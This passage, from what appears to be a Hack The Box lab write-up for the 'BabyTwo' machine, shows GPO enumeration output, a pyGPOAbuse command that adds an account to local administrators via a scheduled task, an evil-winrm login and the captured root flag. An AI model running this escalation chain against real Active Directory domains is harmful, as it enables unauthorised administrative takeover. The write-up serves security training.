+[+] Name: {31B2F340-016D-11D2-945F-00C04FB984F9}
+        [-] displayName: Default Domain Policy
+        [-] gPCFileSysPath: \\baby2.vl\sysvol\baby2.vl\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
+        [-] gPCMachineExtensionNames: [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]
+        [-] versionNumber: 30
+        [-] Verbose: 
+                ---             ---
+                Registry Settings
+                EFS Policy
+                ---             ---
+                Security
+                Computer Restricted Groups
+                ---             ---
+                EFS Recovery
+                EFS Policy
+
+[+] Name: {6AC1786C-016F-11D2-945F-00C04fB984F9}
+        [-] displayName: Default Domain Controllers Policy
+        [-] gPCFileSysPath: \\baby2.vl\sysvol\baby2.vl\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
+        [-] gPCMachineExtensionNames: [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
+        [-] versionNumber: 2
+        [-] Verbose: 
+                ---             ---
+                Security
+                Computer Restricted Groups
+
+[^] Have a nice day!
+</code></pre><h3 id="gpoabuse-for-escalation">GPOabuse for escalation</h3>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/BabyTwo/pyGPOAbuse]
+└─$ python3 pygpoabuse.py baby2.vl/gpoadm:&#39;Password123!&#39; -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -dc-ip 10.129.234.72 -v -command &#39;net localgroup administrators /add gpoadm&#39;
+[*] Version updated
+[+] ScheduledTask TASK_62cfb0ff created!
+</code></pre><h3 id="logging-in-as-gpoadm">Logging in as gpoadm</h3>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/BabyTwo/ntlmv1-multi]
+└─$ evil-winrm -i 10.129.234.72 -u gpoadm -p &#39;Password123!&#39;
+
+*Evil-WinRM* PS C:\Users\gpoadm\Documents&gt;
+
+*Evil-WinRM* PS C:\Users\gpoadm\Documents&gt; net user gpoadm 
+User name                    gpoadm
+Full Name                    gpoadm
+Comment
+User&#39;s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/15/2026 11:20:40 AM
+Password expires             Never
+Password changeable          1/16/2026 11:20:40 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   1/15/2026 11:20:45 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators
+Global Group memberships     *Domain Users
+</code></pre><h3 id="rooted">ROOTED</h3>
+<pre tabindex="0"><code>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt
+293500962edc31fa154951eeeb5740f9
+</code></pre><p>![[Pasted image 20260115204853.png]]</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
